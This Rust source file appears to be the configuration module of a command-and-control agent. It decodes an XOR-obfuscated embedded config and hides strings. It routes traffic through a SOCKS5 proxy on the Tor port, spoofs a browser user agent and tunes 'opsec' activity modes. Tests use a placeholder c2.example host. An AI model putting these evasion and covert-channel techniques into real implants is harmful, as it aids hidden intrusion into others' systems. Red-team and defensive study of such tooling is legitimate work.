use crate::auth::SecretCredential;
use log::{error, info, warn};
use obfstr::obfstr;
use reqwest::{redirect, Client, Proxy, Url};
use serde::{Deserialize, Serialize};
use std::env;
use std::fs;
use std::io;
use std::path::Path;
use std::time::Duration;

const C2_CONNECT_TIMEOUT: Duration = Duration::from_secs(10);
const C2_REQUEST_TIMEOUT: Duration = Duration::from_secs(30);

// Include the generated config file
include!(concat!(env!("OUT_DIR"), "/config.rs"));

// Helper function to deobfuscate the config
fn deobfuscate_config(hex_content: &str, key_str: &str) -> Result<String, String> {
    let key_bytes = key_str.as_bytes();
    if key_bytes.is_empty() {
        return Err("Config XOR key cannot be empty".to_string());
    }
    if (hex_content.len() & 1) != 0 {
        return Err("Invalid hex string length".to_string());
    }

    let mut obfuscated_bytes = Vec::new();
    for chunk in hex_content.as_bytes().chunks_exact(2) {
        let byte_str =
            std::str::from_utf8(chunk).map_err(|e| format!("Invalid hex encoding: {}", e))?;
        let byte = u8::from_str_radix(byte_str, 16)
            .map_err(|e| format!("Invalid hex character: {}", e))?;
        obfuscated_bytes.push(byte);
    }

    for (i, byte) in obfuscated_bytes.iter_mut().enumerate() {
        *byte ^= key_bytes[i % key_bytes.len()];
    }
    String::from_utf8(obfuscated_bytes)
        .map_err(|e| format!("Deobfuscated config is not valid UTF-8: {}", e))
}

pub fn validate_http_url(raw_url: &str) -> Result<Url, String> {
    let url = Url::parse(raw_url).map_err(|e| format!("Invalid URL '{}': {}", raw_url, e))?;

    match url.scheme() {
        "http" | "https" => {}
        scheme => {
            return Err(format!(
                "Unsupported URL scheme '{}'; expected http or https",
                scheme
            ))
        }
    }

    if url.host_str().is_none() {
        return Err("URL must include a host".to_string());
    }

    Ok(url)
}

pub fn validate_c2_base_url(raw_url: &str) -> Result<Url, String> {
    let url = validate_http_url(raw_url)?;

    if !url.username().is_empty() || url.password().is_some() {
        return Err("C2 base URL must not include credentials".to_string());
    }
    if url.query().is_some() || url.fragment().is_some() {
        return Err("C2 base URL must not include query strings or fragments".to_string());
    }

    Ok(url)
}

pub fn same_origin(left: &Url, right: &Url) -> bool {
    left.scheme() == right.scheme()
        && left.host_str() == right.host_str()
        && left.port_or_known_default() == right.port_or_known_default()
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct AgentConfig {
    pub server_url: String,
    pub sleep_interval: u64,
    pub jitter: u64,
    pub payload_id: String,
    #[serde(default)]
    pub agent_id: String,
    #[serde(default)]
    pub listener_id: String,
    #[serde(default, skip_serializing)]
    pub enrollment_credential: SecretCredential,
    pub protocol: String,
    #[serde(default)]
    pub socks5_enabled: bool,
    #[serde(default = "default_socks5_host")]
    pub socks5_host: String,
    #[serde(default = "default_socks5_port")]
    pub socks5_port: u16,
    #[serde(default)]
    pub allow_invalid_certs: bool,
    #[serde(default)]
    pub allow_insecure_isolated_lab: bool,
    #[serde(default = "default_proc_scan_interval")]
    pub proc_scan_interval_secs: u64,
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    #[serde(default = "default_base_score_threshold_bg_to_reduced")]
    pub base_score_threshold_bg_to_reduced: f32,
    #[serde(default = "default_base_score_threshold_reduced_to_full")]
    pub base_score_threshold_reduced_to_full: f32,
    #[serde(default = "default_min_duration_full_opsec")]
    pub min_duration_full_opsec_secs: u64,
    #[serde(default = "default_min_duration_background_opsec")]
    pub min_duration_background_opsec_secs: u64,
    #[serde(default = "default_base_max_consecutive_c2_failures")]
    pub base_max_consecutive_c2_failures: u32,
    #[serde(default = "default_min_duration_reduced_activity_secs")]
    pub min_duration_reduced_activity_secs: u64,
    #[serde(default = "default_reduced_activity_sleep_secs")]
    pub reduced_activity_sleep_secs: u64,
    #[serde(default = "default_c2_failure_threshold_increase_factor")]
    pub c2_failure_threshold_increase_factor: f32,
    #[serde(default = "default_c2_failure_threshold_decrease_factor")]
    pub c2_failure_threshold_decrease_factor: f32,
    #[serde(default = "default_c2_threshold_adjust_interval_secs")]
    pub c2_threshold_adjust_interval_secs: u64,
    #[serde(default = "default_c2_dynamic_threshold_max_multiplier")]
    pub c2_dynamic_threshold_max_multiplier: f32,
}

fn default_socks5_host() -> String {
    obfstr!("127.0.0.1").to_string()
}

fn default_socks5_port() -> u16 {
    9050
}

fn default_proc_scan_interval() -> u64 {
    300
}

fn default_user_agent() -> String {
    // Use a common browser user agent as default
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36".to_string()
}

fn default_base_score_threshold_bg_to_reduced() -> f32 {
    20.0
}

fn default_base_score_threshold_reduced_to_full() -> f32 {
    60.0
}

fn default_min_duration_full_opsec() -> u64 {
    300 // Default 5 minutes in FullOpsec
}

fn default_min_duration_background_opsec() -> u64 {
    60 // Default 1 minute in BackgroundOpsec
}

fn default_base_max_consecutive_c2_failures() -> u32 {
    5 // Default: trigger signal after 5 consecutive failures
}

fn default_min_duration_reduced_activity_secs() -> u64 {
    120 // Default 2 minutes in ReducedActivity
}

fn default_reduced_activity_sleep_secs() -> u64 {
    120 // Default 2 minutes sleep for ReducedActivity
}

fn default_c2_failure_threshold_increase_factor() -> f32 {
    1.0 // Default: No increase
}

fn default_c2_failure_threshold_decrease_factor() -> f32 {
    1.0 // Default: No decrease
}

fn default_c2_threshold_adjust_interval_secs() -> u64 {
    u64::MAX // Default: Effectively disable periodic adjustment
}

fn default_c2_dynamic_threshold_max_multiplier() -> f32 {
    1.0 // Default: Dynamic threshold cannot exceed base threshold
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            server_url: String::new(),
            sleep_interval: 5,
            jitter: 2,
            payload_id: String::new(),
            agent_id: String::new(),
            listener_id: String::new(),
            enrollment_credential: SecretCredential::default(),
            protocol: obfstr!("http").to_string(),
            socks5_enabled: false,
            socks5_host: obfstr!("127.0.0.1").to_string(),
            socks5_port: 9050,
            allow_invalid_certs: false,
            allow_insecure_isolated_lab: false,
            proc_scan_interval_secs: default_proc_scan_interval(),
            user_agent: default_user_agent(),
            base_score_threshold_bg_to_reduced: default_base_score_threshold_bg_to_reduced(),
            base_score_threshold_reduced_to_full: default_base_score_threshold_reduced_to_full(),
            min_duration_full_opsec_secs: default_min_duration_full_opsec(),
            min_duration_background_opsec_secs: default_min_duration_background_opsec(),
            base_max_consecutive_c2_failures: default_base_max_consecutive_c2_failures(),
            min_duration_reduced_activity_secs: default_min_duration_reduced_activity_secs(),
            reduced_activity_sleep_secs: default_reduced_activity_sleep_secs(),
            c2_failure_threshold_increase_factor: default_c2_failure_threshold_increase_factor(),
            c2_failure_threshold_decrease_factor: default_c2_failure_threshold_decrease_factor(),
            c2_threshold_adjust_interval_secs: default_c2_threshold_adjust_interval_secs(),
            c2_dynamic_threshold_max_multiplier: default_c2_dynamic_threshold_max_multiplier(),
        }
    }
}

// The AgentConfig struct is used to load and manage the agent's configuration.
impl AgentConfig {
    pub fn load() -> io::Result<Self> {
        // First try using the embedded config
        match deobfuscate_config(EMBEDDED_CONFIG_HEX, EMBEDDED_CONFIG_XOR_KEY) {
            Ok(deobfuscated_json) => {
                if let Ok(config) = serde_json::from_str::<AgentConfig>(&deobfuscated_json) {
                    if !config.server_url.is_empty() && !config.payload_id.is_empty() {
                        return Ok(config);
                    }
                    warn!("[WARNING] Embedded config invalid after deobfuscation (missing server_url or payload_id)");
                } else {
                    warn!("[WARNING] Failed to parse deobfuscated embedded config");
                }
            }
            Err(e) => {
                warn!("[WARNING] Failed to deobfuscate embedded config: {}", e);
            }
        }

        // Try filesystem config as fallback
        if let Ok(exe_path) = env::current_exe() {
            let exe_dir = exe_path.parent().unwrap_or(Path::new("."));
            let config_path = exe_dir.join(".config").join("config.json");

            if config_path.exists() {
                if let Ok(contents) = fs::read_to_string(&config_path) {
                    if let Ok(config) = serde_json::from_str::<AgentConfig>(&contents) {
                        if !config.server_url.is_empty() && !config.payload_id.is_empty() {
                            return Ok(config);
                        }
                    }
                }
            }
        }

        // No valid config found
        Err(io::Error::new(
            io::ErrorKind::NotFound,
            "No valid configuration found",
        ))
    }

    pub fn get_server_url(&self) -> String {
        if self.server_url.starts_with("http://") || self.server_url.starts_with("https://") {
            self.server_url.clone()
        } else {
            format!("{}://{}", self.protocol, self.server_url)
        }
    }

    pub fn get_validated_server_url(&self) -> Result<Url, String> {
        self.validate_transport_policy(&self.get_server_url())
    }

    pub fn validate_transport_policy(&self, raw_url: &str) -> Result<Url, String> {
        let url = validate_c2_base_url(raw_url)?;
        if url.scheme() != "https" && !self.allow_insecure_isolated_lab {
            return Err(
                "plaintext C2 transport is disabled; isolated lab builds must explicitly opt in"
                    .to_string(),
            );
        }
        if self.allow_invalid_certs && !self.allow_insecure_isolated_lab {
            return Err(
                "invalid TLS certificates require the isolated-lab transport override".to_string(),
            );
        }
        Ok(url)
    }

    /// Build an HTTP client that respects the SOCKS5 proxy config and logs the proxy status.
    pub fn build_http_client(&self) -> Result<Client, io::Error> {
        if self.allow_invalid_certs && !self.allow_insecure_isolated_lab {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "invalid TLS certificates require the isolated-lab transport override",
            ));
        }
        let mut builder = Client::builder()
            .user_agent(self.user_agent.clone())
            .redirect(redirect::Policy::none())
            .connect_timeout(C2_CONNECT_TIMEOUT)
            .timeout(C2_REQUEST_TIMEOUT)
            // Agent traffic must never inherit an ambient OS/environment proxy.
            // The configured SOCKS5 transport below is the only proxy path.
            .no_proxy();

        if self.allow_invalid_certs {
            warn!("[HTTP] TLS certificate verification is disabled by isolated-lab config");
            builder = builder.danger_accept_invalid_certs(self.allow_invalid_certs);
        }

        if self.socks5_enabled {
            let proxy_url = format!("socks5h://{}:{}", self.socks5_host, self.socks5_port);
            info!(
                "[HTTP] Building HTTP client with SOCKS5 proxy: {}",
                proxy_url
            );
            match builder
                .proxy(Proxy::all(&proxy_url).map_err(|e| {
                    error!("[HTTP] Invalid proxy URL: {}", e);
                    io::Error::other(format!("Invalid proxy URL: {}", e))
                })?)
                .build()
            {
                Ok(client) => Ok(client),
                Err(e) => {
                    error!(
                        "[HTTP] Failed to build HTTP client with SOCKS5 proxy: {}",
                        e
                    );
                    Err(io::Error::other(format!(
                        "Failed to build HTTP client with proxy: {}",
                        e
                    )))
                }
            }
        } else {
            info!("[HTTP] Building HTTP client with direct connection (no proxy)");
            builder.build().map_err(io::Error::other)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn validates_configured_server_urls() -> Result<(), String> {
        let direct = AgentConfig {
            server_url: "https://c2.example:8443".to_string(),
            ..Default::default()
        };
        assert_eq!(
            direct.get_validated_server_url()?.as_str(),
            "https://c2.example:8443/"
        );

        let with_protocol = AgentConfig {
            server_url: "c2.example:8443".to_string(),
            protocol: "https".to_string(),
            ..Default::default()
        };
        assert_eq!(
            with_protocol.get_validated_server_url()?.as_str(),
            "https://c2.example:8443/"
        );

        Ok(())
    }

    #[test]
    fn transport_policy_requires_explicit_isolated_lab_override() {
        let secure = AgentConfig {
            server_url: "https://c2.example".to_string(),
            ..Default::default()
        };
        assert!(secure.get_validated_server_url().is_ok());

        let plaintext = AgentConfig {
            server_url: "http://127.0.0.1:8080".to_string(),
            ..Default::default()
        };
        assert!(plaintext.get_validated_server_url().is_err());

        let isolated_lab = AgentConfig {
            allow_insecure_isolated_lab: true,
            ..plaintext.clone()
        };
        assert!(isolated_lab.get_validated_server_url().is_ok());

        let invalid_certs = AgentConfig {
            server_url: "https://c2.example".to_string(),
            allow_invalid_certs: true,
            ..Default::default()
        };
        assert!(invalid_certs.get_validated_server_url().is_err());
        assert!(invalid_certs.build_http_client().is_err());

        let isolated_invalid_certs = AgentConfig {
            allow_insecure_isolated_lab: true,
            ..invalid_certs
        };
        assert!(isolated_invalid_certs.get_validated_server_url().is_ok());
        assert!(isolated_invalid_certs.build_http_client().is_ok());
    }

    #[test]
    fn serialized_config_omits_bootstrap_credentials() {
        let bootstrap = "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI";
        let config = AgentConfig {
            enrollment_credential: SecretCredential::new_bootstrap(bootstrap).expect("credential"),
            ..Default::default()
        };
        let serialized = serde_json::to_string(&config).expect("serialize config");
        assert!(!serialized.contains(bootstrap));
        assert!(!serialized.contains("enrollment_credential"));
    }

    #[test]
    fn bootstrap_constructor_rejects_weak_or_noncanonical_values() {
        for invalid in [
            "",
            "bootstrap-secret",
            "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI=",
            "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJ",
        ] {
            assert!(SecretCredential::new_bootstrap(invalid).is_err());
        }
    }

    #[tokio::test]
    async fn c2_client_does_not_follow_redirects() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        use tokio::net::TcpListener;

        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .expect("bind redirect test server");
        let address = listener.local_addr().expect("redirect test address");
        let server = tokio::spawn(async move {
            let (mut stream, _) = listener.accept().await.expect("accept redirect request");
            let mut request = [0_u8; 1024];
            let _ = stream
                .read(&mut request)
                .await
                .expect("read redirect request");
            let response = format!(
                "HTTP/1.1 302 Found\r\nLocation: http://{address}/credential-sink\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
            );
            stream
                .write_all(response.as_bytes())
                .await
                .expect("write redirect response");
        });

        let config = AgentConfig {
            allow_insecure_isolated_lab: true,
            ..Default::default()
        };
        let response = config
            .build_http_client()
            .expect("build client")
            .get(format!("http://{address}/original"))
            .bearer_auth("must-not-forward")
            .send()
            .await
            .expect("redirect response");
        assert_eq!(response.status(), reqwest::StatusCode::FOUND);
        server.await.expect("redirect test server");
    }

    #[test]
    fn rejects_unsupported_c2_base_urls() {
        for raw_url in [
            "file:///tmp/config",
            "ftp://c2.example",
            "https://user:pass@c2.example",
            "https://c2.example/path?token=1",
            "https://c2.example/path#fragment",
        ] {
            assert!(
                validate_c2_base_url(raw_url).is_err(),
                "{} should be rejected",
                raw_url
            );
        }
    }

    #[test]
    fn compares_url_origins() -> Result<(), String> {
        let left = validate_http_url("https://c2.example/path")?;
        let same = validate_http_url("https://c2.example/other")?;
        let different = validate_http_url("http://c2.example/path")?;

        assert!(same_origin(&left, &same));
        assert!(!same_origin(&left, &different));

        Ok(())
    }

    #[test]
    fn deobfuscate_config_rejects_invalid_inputs() {
        assert!(deobfuscate_config("f", "k").is_err());
        assert!(deobfuscate_config("zz", "k").is_err());
        assert!(deobfuscate_config("00", "").is_err());
    }

    #[test]
    fn obfuscated_config_round_trips_with_seed_derived_key() {
        // build.rs derives the XOR key from the mutation seed (issue #67); the
        // deobfuscation path must round-trip with any non-empty random key.
        let json = r#"{"server_url":"https://c2.example:8443","sleep_interval":5,"jitter":2,"payload_id":"payload-one","protocol":"https"}"#;
        let key = "9f3ac71b04e5d2881642aa07ccdefb53";
        let key_bytes = key.as_bytes();

        let mut obfuscated = json.as_bytes().to_vec();
        for (i, byte) in obfuscated.iter_mut().enumerate() {
            *byte ^= key_bytes[i % key_bytes.len()];
        }
        let hex: String = obfuscated.iter().map(|b| format!("{:02x}", b)).collect();

        let decoded = deobfuscate_config(&hex, key).expect("config should round-trip");
        let config: AgentConfig = serde_json::from_str(&decoded).expect("valid config JSON");
        assert_eq!(config.server_url, "https://c2.example:8443");
        assert_eq!(config.payload_id, "payload-one");
    }

    #[test]
    fn embedded_config_deobfuscates_with_embedded_key() {
        // The generated EMBEDDED_CONFIG_* consts must always be consistent,
        // regardless of which seed produced them.
        let decoded = deobfuscate_config(EMBEDDED_CONFIG_HEX, EMBEDDED_CONFIG_XOR_KEY)
            .expect("embedded config should deobfuscate with embedded key");
        serde_json::from_str::<AgentConfig>(&decoded).expect("embedded config should parse");
    }
}
